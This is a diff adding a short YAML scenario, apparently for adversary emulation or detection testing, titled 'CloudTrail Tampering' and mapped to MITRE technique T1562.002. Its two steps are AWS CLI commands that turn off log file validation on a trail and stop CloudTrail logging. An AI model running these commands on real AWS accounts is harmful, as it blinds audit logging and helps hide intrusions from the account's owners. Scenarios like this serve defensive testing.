@@ -1,0 +1,9 @@
+name: CloudTrail Tampering
+description: CloudTrail Tampering
+mitre_technique: T1562.002
+stage: Defense Evasion
+steps:
+- action: aws cloudtrail update-trail --name trail-name --enable-log-file-validation false
+  description: Disable log validation to allow tampering
+- action: aws cloudtrail stop-logging --name trail-name
+  description: Stop logging
